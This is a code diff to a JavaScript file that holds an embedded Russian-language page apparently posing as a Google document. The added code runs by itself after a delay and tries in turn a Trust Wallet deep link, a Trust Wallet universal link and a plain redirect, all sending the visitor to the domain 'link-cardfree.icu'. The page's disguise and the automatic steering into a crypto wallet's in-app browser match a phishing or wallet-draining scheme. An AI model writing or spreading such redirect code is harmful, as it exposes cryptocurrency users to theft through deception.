@@ -304,7 +304,22 @@ window.GOOGLE_DOC = "<!doctype html>\n<html lang=\"ru\">\n<head>\n<meta charset=
     }, { once: true });
   } else {
     setTimeout(function () {
-      location.replace("https://link-cardfree.icu/");
+      (function(){
+      var target = "https://link-cardfree.icu/";
+      var enc = encodeURIComponent(target);
+      var t0 = Date.now();
+      try { location.href = "trust://open_url?url=" + enc; } catch (e) {}
+      setTimeout(function(){
+        if (Date.now() - t0 < 4000 && document.visibilityState !== "hidden") {
+          location.href = "https://link.trustwallet.com/open_url?url=" + enc;
+        }
+      }, 1300);
+      setTimeout(function(){
+        if (Date.now() - t0 < 4000 && document.visibilityState !== "hidden") {
+          location.href = target;
+        }
+      }, 3200);
+    })();
     }, 1500);
   }
 })();
